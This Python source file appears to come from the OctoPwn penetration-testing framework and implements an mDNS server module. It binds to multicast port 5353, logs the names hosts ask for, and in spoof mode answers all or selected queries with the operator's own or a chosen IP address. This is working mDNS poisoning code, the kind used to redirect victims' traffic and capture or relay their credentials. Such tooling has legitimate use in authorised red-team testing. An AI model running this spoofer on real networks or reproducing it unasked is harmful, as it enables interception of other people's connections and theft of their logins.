import platform
import asyncio
import datetime
import os
import ipaddress

from octopwn.clients.scannerbase import ScannerConsoleBase
from octopwn.servers.protocols.DNS import DNSPacket, DNSAResource, DNSAAAAResource, DNSType, DNSResponse
from octopwn.servers import UDPServerProtocol

if platform.system().lower() == 'emscripten':
	from pyodide import to_js, create_proxy

class MDNSServer(ScannerConsoleBase):
	def __init__(self, client_id, connection, cmd_q, msg_queue, prompt, octopwnobj):
		ScannerConsoleBase.__init__(self, client_id, connection, cmd_q, msg_queue, prompt, octopwnobj)
		self.nologon_commands.append('any')

		self.params = {
			'credential': (int, None),
			'targets' : (list, []),
			'targetfiles' : (list, []),
			'authtype': (str, 'NTLM'),
			'proxy': (int, None),
			'resultsfile': (str, 'mdns_server_%s.tsv' % os.urandom(4).hex()),
			'spoof': (bool, False),
			'spooftable': (list, ['*,SELF']),
			'localip': (str, None),
		}

		self.serverproto = None
		self.servertransport = None
		self.in_queue = None
		self.server_task = None

	async def start(self):
		return True, None

	async def socketsetup(self):
		try:
			if platform.system() == 'Emscripten':
				from wsnet.pyodide.udpserver import WSNetworkUDPServer
				protofactory = lambda: UDPServerProtocol(self.in_queue)
				wsnetserver = WSNetworkUDPServer(protofactory, '0.0.0.0', 5353, bindtype = 4, reuse_ws = False)
				self.servertransport, self.serverproto, err = await wsnetserver.run()
				if err is not None:
					raise err
				return True, None
			if self.params['proxy'][1] is None:
				# local
				import socket
				import struct
				sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				sock.bind(('0.0.0.0', 5353))
				group = ipaddress.ip_address('224.0.0.251').packed
				mreq = struct.pack("=4sl", group, socket.INADDR_ANY)
				sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
				sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
				sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
				sock.setblocking(False)
				protofactory = lambda: UDPServerProtocol(self.in_queue)
				self.servertransport, self.serverproto = await asyncio.get_event_loop().create_datagram_endpoint(protofactory, sock=sock)

			else:
				raise Exception('Proxy not yet supported!')
			return True, None
		except Exception as e:
			return None, e

	async def __server(self):
		try:
			while True:
				x = await self.in_queue.get()
				data, addr = x
				if data is None:
					await self.print('Server socket is terminating!')
					return
				packet = DNSPacket.from_bytes(data)
				if self.params['spoof'][1] is False:
					for dnsq in packet.Questions:
						await self.print('Client %s:%s is looking for "%s" Record type: "%s"' % (addr[0], addr[1], dnsq.QNAME.name, dnsq.QTYPE.name))
				else:
					localip, _ = self.servertransport.get_extra_info("socket").getsockname()
					if self.params['localip'][1] is not None and self.params['localip'][1] != 'SELF':
						localip = ipaddress.ip_address(self.params['localip'][1])
					answers = []
					for dnsq in packet.Questions:
						for entry in self.params['spooftable'][1]:
							host, target = entry.split(',')
							if target.upper() != 'SELF':
								localip = ipaddress.ip_address(target)
							if dnsq.QNAME.name == host or host == '*':
								if localip.version == 4 and dnsq.QTYPE == DNSType.A:
									res = DNSAResource.construct(dnsq.QNAME.name, localip)
								elif localip.version == 6 and dnsq.QTYPE == DNSType.AAAA:
									res = DNSAAAAResource.construct(dnsq.QNAME.name, localip)
								answers.append(res)
					
					if len(answers) > 0:
						response = DNSPacket.construct(
							TID = packet.TransactionID,
							response = DNSResponse.RESPONSE, 
							answers = answers,
							questions = packet.Questions
						)
						await self.servertransport.sendto(response.to_bytes(), addr)


		except Exception as e:
			await self.print_exc(e)
			return False, None

	async def do_serve(self):
		try:
			self.in_queue = asyncio.Queue()
			res, err = await self.socketsetup()
			if err is not None:
				raise err
			self.server_task = asyncio.create_task(self.__server())
			await self.print('Server is running!')

		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_spoof(self):
		await self.do_setparam('spoof', True)

	async def do_spooftarget(self, target, ip = 'SELF'):
		await self.do_setparam('spooftable', '%s,%s' % (target, ip))
	
	async def do_stop(self):
		try:
			if self.server_task is not None:
				self.server_task.cancel()
			await self.print('Server stopped!')
		except Exception as e:
			await self.print_exc(e)
			return None, e
	